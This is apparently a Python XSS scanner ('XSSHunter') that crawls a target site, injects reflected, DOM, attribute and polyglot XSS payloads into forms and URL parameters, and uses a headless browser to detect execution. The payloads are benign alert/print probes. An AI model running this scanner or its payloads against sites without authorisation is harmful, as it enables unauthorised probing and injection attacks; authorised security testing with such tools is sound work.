import argparse
import concurrent.futures
import csv
import json
import random
import threading
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, quote, parse_qs
from playwright.sync_api import sync_playwright
import html
import xml.etree.ElementTree as ET
from datetime import datetime

class XSSHunter:
    def __init__(self, target_url, output_formats=None, output_file="xss_report", proxy_url=None):
        self.target_url = target_url
        self.output_formats = output_formats or []
        self.output_file = output_file
        self.proxy_url = proxy_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.lock = threading.Lock()
        self.stop_scan = False  # Add stop_scan flag
        
        # Configure proxy if specified
        if self.proxy_url:
            self.session.proxies = {
                'http': self.proxy_url,
                'https': self.proxy_url
            }
            self.session.verify = False  # Disable SSL verification for Burp
            
        # Configuration
        self.max_workers = 3
        self.scan_depth = 2
        self.timeout = 10
        self.rate_limit = 1.0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36'
        ]

    def get_xss_payloads(self, context='all'):
        payloads = {
            'reflected': [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '" onfocus="alert(1)" autofocus x="',
                "' onfocus='alert(1)' autofocus x='",
                'javascript:alert(1)//',
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>'
            ],
            'dom': [
                '#<img src=x onerror=print()>',
                '#javascript:print()'
            ],
            'attribute': [
                '" onload="alert(1)',
                "' onload='alert(1)"
            ],
            'polyglot': [
                r'jaVasCript:/*-/*`/*\`/*\'/*"/**/(alert(1))//%0D%0A//</style>'
            ],
            'sink_specific': {
                'jquery': ['<img src=x onerror=print()>'],
                'hashchange': ['<img src=x onerror=print()>'],
                'document.write': ['"><svg onload=print()>'],
                'innerHTML': ['<img src=x onerror=print()>']
            }
        }
        return payloads.get(context, [p for category in payloads.values() 
                                    for p in (category if isinstance(category, list) else [])])

    def crawl(self, url, depth=0):
        if self.stop_scan or depth > self.scan_depth or url in self.crawled_urls:
            return
            
        self.crawled_urls.add(url)
        
        try:
            headers = {'User-Agent': random.choice(self.user_agents)}
            response = self.session.get(url, headers=headers, timeout=self.timeout)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Process forms
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                if not self.stop_scan:
                    list(executor.map(lambda form: self.test_form(form, url), soup.find_all('form')))
            
            # Process links
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = []
                for link in soup.find_all('a', href=True):
                    if self.stop_scan:
                        break
                    new_url = urljoin(url, link['href'])
                    if urlparse(new_url).netloc == urlparse(self.target_url).netloc:
                        futures.append(executor.submit(self.crawl, new_url, depth+1))
                concurrent.futures.wait(futures)
            
            # Process URL parameters
            if not self.stop_scan and '?' in url:
                params = parse_qs(urlparse(url).query)
                with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    list(executor.map(lambda param: self.test_url_param(url, param), params.keys()))

        except Exception as e:
            print(f"[-] Error crawling {url}: {str(e)}")

    def test_form(self, form, url):
        form_details = {
            'action': urljoin(url, form.get('action', '')),
            'method': form.get('method', 'get').lower(),
            'inputs': []
        }
        
        for input_tag in form.find_all(['input', 'textarea']):
            input_details = {
                'type': input_tag.get('type', 'text'),
                'name': input_tag.get('name'),
                'value': input_tag.get('value', '')
            }
            form_details['inputs'].append(input_details)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            list(executor.map(lambda p: self.test_form_payload(form_details, p), 
                            self.get_xss_payloads()))

    def test_form_payload(self, form_details, payload):
        data = {}
        for input_field in form_details['inputs']:
            if input_field['type'] == 'hidden':
                data[input_field['name']] = input_field['value']
            else:
                data[input_field['name']] = payload
        
        try:
            time.sleep(self.rate_limit)
            if form_details['method'] == 'post':
                response = self.session.post(form_details['action'], data=data)
            else:
                response = self.session.get(form_details['action'], params=data)
            
            self.detect_vulnerabilities(response, payload, 'form', form_details['action'])
        except Exception as e:
            print(f"[-] Form test error: {str(e)}")

    def test_url_param(self, url, param):
        base_url = url.split('?')[0]
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            list(executor.map(
                lambda p: self.test_param_payload(base_url, param, p),
                self.get_xss_payloads()
            ))

    def test_param_payload(self, base_url, param, payload):
        try:
            time.sleep(self.rate_limit)
            test_url = f"{base_url}?{param}={quote(payload)}"
            response = self.session.get(test_url)
            self.detect_vulnerabilities(response, payload, 'url_param', test_url)
        except Exception as e:
            print(f"[-] Param test error: {str(e)}")

    def detect_vulnerabilities(self, response, payload, context, source):
        if payload in response.text:
            self.report_vulnerability('Reflected', payload, source)
        
        decoded_payload = html.unescape(payload)
        if decoded_payload in response.text:
            self.report_vulnerability('Reflected (HTML-decoded)', payload, source)
        
        if any(trigger in response.text.lower() for trigger in ['onmouseover=', 'onload=', 'onfocus=']):
            self.report_vulnerability('Potential Attribute XSS', payload, source)
        
        if context == 'form' and 'thank you' in response.text.lower():
            self.report_vulnerability('Potential Stored', payload, source)

    def check_for_xss(self, page):
        try:
            page.evaluate("""() => {
                window.xssDetected = false;
                window.alert = () => { window.xssDetected = true; };
                window.print = () => { window.xssDetected = true; };
            }""")
            
            page.wait_for_timeout(1000)
            return page.evaluate("""() => window.xssDetected""")
        except:
            return False

    def run_dom_test(self, payload, test_type, sink=None):
        try:
            proxy_args = {}
            if self.proxy_url:
                proxy_host, proxy_port = self.proxy_url.split('//')[1].split(':')
                proxy_args['proxy'] = {
                    'server': f'{proxy_host}:{proxy_port}',
                    'username': '',  # Add if your proxy requires authentication
                    'password': ''
                }

            with sync_playwright() as playwright:
                browser = playwright.chromium.launch(
                    headless=True,
                    **proxy_args
                )
                context = browser.new_context(ignore_https_errors=True)
                page = context.new_page()
                
                if test_type == 'hashchange':
                    page.goto(self.target_url)
                    page.evaluate(f"""() => {{
                        const iframe = document.createElement('iframe');
                        iframe.src = '{self.target_url}#';
                        iframe.onload = function() {{
                            this.src += {json.dumps(payload)};
                        }};
                        document.body.appendChild(iframe);
                    }}""")
                    time.sleep(2)
                elif sink:
                    page.goto(self.target_url)
                    escaped_payload = json.dumps(payload)
                    page.evaluate(f"""
                        try {{
                            {sink}({escaped_payload});
                        }} catch(e) {{
                            console.log('Sink error:', e);
                        }}
                    """)
                else:
                    page.goto(f"{self.target_url}#{payload}")
                
                if self.check_for_xss(page):
                    vuln_type = 'DOM XSS' + (f' ({sink})' if sink else '')
                    self.report_vulnerability(vuln_type, payload, page.url)
                
                page.close()
                context.close()
                browser.close()
        except Exception as e:
            print(f"DOM test failed: {str(e)}")

    def report_vulnerability(self, vuln_type, payload, location):
        timestamp = datetime.now().isoformat()
        with self.lock:
            print(f"\033[91m[!] [{timestamp}] {vuln_type} found at {location}\033[0m")
            print(f"    Payload: {payload}\n")
            self.vulnerabilities.append({
                'type': vuln_type,
                'payload': payload,
                'location': location,
                'timestamp': timestamp
            })

    def export_reports(self):
        for fmt in self.output_formats:
            fmt_lower = fmt.lower()
            if fmt_lower == 'json':
                self.export_json()
            elif fmt_lower == 'csv':
                self.export_csv()
            elif fmt_lower == 'xml':
                self.export_xml()
            else:
                print(f"[!] Unknown output format: {fmt}")

    def export_json(self):
        filename = f"{self.output_file}.json"
        with open(filename, 'w') as f:
            json.dump(self.vulnerabilities, f, indent=4)
        print(f"[+] JSON report saved to {filename}")

    def export_csv(self):
        filename = f"{self.output_file}.csv"
        with open(filename, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=['type', 'payload', 'location', 'timestamp'])
            writer.writeheader()
            for vuln in self.vulnerabilities:
                writer.writerow(vuln)
        print(f"[+] CSV report saved to {filename}")

    def export_xml(self):
        filename = f"{self.output_file}.xml"
        root = ET.Element('vulnerabilities')
        for vuln in self.vulnerabilities:
            vuln_elem = ET.SubElement(root, 'vulnerability')
            ET.SubElement(vuln_elem, 'type').text = vuln['type']
            ET.SubElement(vuln_elem, 'payload').text = vuln['payload']
            ET.SubElement(vuln_elem, 'location').text = vuln['location']
            ET.SubElement(vuln_elem, 'timestamp').text = vuln['timestamp']
        tree = ET.ElementTree(root)
        tree.write(filename, encoding='utf-8', xml_declaration=True)
        print(f"[+] XML report saved to {filename}")

    def start_scan(self):
        print(f"\033[94m[*] Starting scan on {self.target_url}\033[0m")
        self.stop_scan = False  # Reset stop_scan flag
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            executor.submit(self.crawl, self.target_url)
            executor.submit(self.run_dom_tests)

        if self.stop_scan:
            print(f"\n\033[93m[!] Scan stopped by user.\033[0m")
        else:
            print(f"\n\033[92m[+] Scan complete. Found {len(self.vulnerabilities)} vulnerabilities.\033[0m")
        
        if self.output_formats and not self.stop_scan:
            self.export_reports()

    def run_dom_tests(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            # Standard DOM tests
            for payload in self.get_xss_payloads('dom') + self.get_xss_payloads('polyglot'):
                if self.stop_scan:
                    break
                futures.append(executor.submit(
                    self.run_dom_test, payload, 'standard'
                ))
            
            # Hashchange tests
            for payload in self.get_xss_payloads('sink_specific')['hashchange']:
                if self.stop_scan:
                    break
                futures.append(executor.submit(
                    self.run_dom_test, payload, 'hashchange'
                ))
            
            # Sink-specific tests
            for sink, payloads in self.get_xss_payloads('sink_specific').items():
                if sink != 'hashchange':
                    for payload in payloads:
                        if self.stop_scan:
                            break
                        futures.append(executor.submit(
                            self.run_dom_test, payload, 'sink', sink
                        ))
            
            for future in concurrent.futures.as_completed(futures):
                if self.stop_scan:
                    break
                try:
                    future.result()
                except Exception as e:
                    print(f"DOM test error: {str(e)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Advanced XSS Vulnerability Scanner with Burp Integration",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Example:\n  python xss_scanner.py -u http://example.com -w 3 -f csv -p http://127.0.0.1:8080"
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-w", "--workers", type=int, default=3, help="Thread workers")
    parser.add_argument("-f", "--format", 
                        help="Output formats (comma-separated: csv,json,xml)", 
                        default="", 
                        type=lambda s: s.split(','))
    parser.add_argument("-o", "--output", 
                        help="Output base filename", 
                        default="xss_report")
    parser.add_argument("-p", "--proxy", 
                        help="Burp Suite proxy URL (e.g., http://127.0.0.1:8080)", 
                        default=None)
    
    try:
        args = parser.parse_args()
        scanner = XSSHunter(
            args.url, 
            output_formats=args.format, 
            output_file=args.output,
            proxy_url=args.proxy
        )
        scanner.max_workers = args.workers
        scanner.start_scan()
    except KeyboardInterrupt:
        print("\n\033[91mScan interrupted\033[0m")
        exit(1)